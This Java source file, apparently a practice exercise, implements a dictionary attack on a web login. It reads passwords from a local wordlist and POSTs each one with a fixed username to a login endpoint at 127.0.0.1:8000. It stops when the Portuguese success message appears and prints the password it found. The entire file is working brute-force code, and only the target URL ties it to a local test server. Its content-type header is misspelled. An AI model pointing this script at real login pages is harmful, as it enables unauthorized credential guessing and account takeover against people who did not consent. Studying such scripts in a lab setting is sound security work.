package attack;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Paths;

public class DictionaryAttack {
	private static final String PASSWORD_FILE = Paths.get(System.getProperty("user.dir"), "src", "passwordTest.txt").toString();
	private static final String URL = "http://127.0.0.1:8000/login-page/";
	private static final String USER_TEST = "teste_usuario";
	
	private static final HttpClient CLIENT = HttpClient.newHttpClient();
	
	public static void attack() {
		readPassword();
	}
	
	private static void readPassword() {
		try(BufferedReader reader = new BufferedReader(new FileReader(PASSWORD_FILE))){
			String password = "";
			
			while((password = reader.readLine()) != null) {
				passwordTest(password);
			}
		} 
		catch(IOException e) {
			System.err.println("Erro em ler o arquivo: "+e.getMessage());
		}
	}
	
	private static void passwordTest(String password) {
		String jsonPayload = String.format("{\"username\": \"%s\", \"password\": \"%s\"}",USER_TEST, password);
		
		HttpRequest request = HttpRequest.newBuilder()
				.uri(URI.create(URL))
				.header("content-type", "apllication/json")
				.POST(HttpRequest.BodyPublishers.ofString(jsonPayload))
				.build();
		
		try {
			HttpResponse<String> response = CLIENT.send(request, HttpResponse.BodyHandlers.ofString());
			
			System.out.println("Testando senha: "+password+" | Status: "+response.statusCode());
			
			if(response.body().contains("Login realizado com sucesso!")) {
				System.out.println("Senha encontrada: "+password);
				System.exit(0);
			}
		}
		catch(Exception e) {
			System.err.println("Erro ao enviar requisição: "+e.getMessage());
			System.exit(0);
		}
	}
	
	
}
